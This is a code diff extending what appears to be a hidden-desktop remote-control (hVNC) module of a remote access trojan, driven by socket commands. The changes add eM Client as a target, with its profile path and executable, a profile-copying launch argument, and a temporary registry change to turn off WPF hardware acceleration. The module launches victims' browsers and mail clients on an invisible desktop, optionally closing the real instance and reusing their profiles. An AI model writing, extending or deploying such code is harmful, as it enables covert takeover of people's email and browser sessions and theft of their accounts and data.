@@ -77,6 +77,7 @@ static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;
 static atomic_bool g_captureRunning(false);
 static thread g_captureThread;
 static mutex g_captureMutex;
+static atomic_uint g_spawnedProcessId(0);
 static mutex g_sendMutex;
 static SOCKET g_socket = INVALID_SOCKET;
 static int g_scalePercent = 50;
@@ -944,6 +945,25 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD trackedPid = g_spawnedProcessId.load();
+                if (trackedPid != 0) {
+                    DWORD wpid = 0;
+                    GetWindowThreadProcessId(hwnd, &wpid);
+                    if (wpid == trackedPid) {
+                        wchar_t title[512] = {0};
+                        GetWindowTextW(hwnd, title, 512);
+                        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                        HWND owner = GetWindow(hwnd, GW_OWNER);
+                        if (wcslen(title) > 0 && (style & WS_CAPTION) && owner == NULL) {
+                            if (IsIconic(hwnd) || !IsWindowVisible(hwnd)) {
+                                ShowWindow(hwnd, SW_RESTORE);
+                                SetForegroundWindow(hwnd);
+                            }
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -1905,11 +1925,12 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"Opera" || browserName == L"Opera GX" || browserName == L"eM Client") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
-        else path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"Opera GX") path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"eM Client") path += L"\\eM Client";
         return path;
     } else {
         if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
@@ -1924,6 +1945,38 @@ static wstring get_browser_profile_path(const wstring& browserName) {
             return L"";
         }
         return path;
+    }
+}
+
+static bool g_hadDisableHWAcceleration = false;
+static DWORD g_oldDisableHWAccelerationVal = 0;
+
+static void set_wpf_hw_acceleration_registry(bool disable) {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Avalon.Graphics";
+    if (disable) {
+        g_hadDisableHWAcceleration = false;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD size = sizeof(DWORD);
+            if (RegQueryValueExW(hKey, L"DisableHWAcceleration", NULL, NULL, (LPBYTE)&g_oldDisableHWAccelerationVal, &size) == ERROR_SUCCESS) {
+                g_hadDisableHWAcceleration = true;
+            }
+            RegCloseKey(hKey);
+        }
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            DWORD val = 1;
+            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&val, sizeof(DWORD));
+            RegCloseKey(hKey);
+        }
+    } else {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            if (g_hadDisableHWAcceleration) {
+                RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&g_oldDisableHWAccelerationVal, sizeof(DWORD));
+            } else {
+                RegDeleteValueW(hKey, L"DisableHWAcceleration");
+            }
+            RegCloseKey(hKey);
+        }
     }
 }
 
@@ -2079,6 +2132,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         initialize_visual_styles();
 
         if (action == "hvnc_start") {
+            g_spawnedProcessId.store(0);
             g_scalePercent = cmd.value("quality", 50);
             if (g_scalePercent < 10) g_scalePercent = 10;
             if (g_scalePercent > 100) g_scalePercent = 100;
@@ -2108,6 +2162,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 g_patchThread = thread(patch_loop);
             }
         } else if (action == "hvnc_stop") {
+            g_spawnedProcessId.store(0);
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
@@ -2156,7 +2211,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2234,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2225,6 +2282,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             } else if (wRequestedPath == L"Thunderbird") {
                                 exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
                                 if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+                            } else if (wRequestedPath == L"eM Client") {
+                                exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
                             }
                         }
                     }
@@ -2343,6 +2403,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        if (copyProfile && !profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
+                        } else {
+                            args = L"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2463,14 +2529,25 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    if (wRequestedPath == L"eM Client") {
+                        set_wpf_hw_acceleration_registry(true);
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_spawnedProcessId.store(pi.dwProcessId);
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
                         send_status("Browser started on hidden desktop");
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
+
+                    if (wRequestedPath == L"eM Client") {
+                        set_wpf_hw_acceleration_registry(false);
                     }
 
                     if (isGecko) {
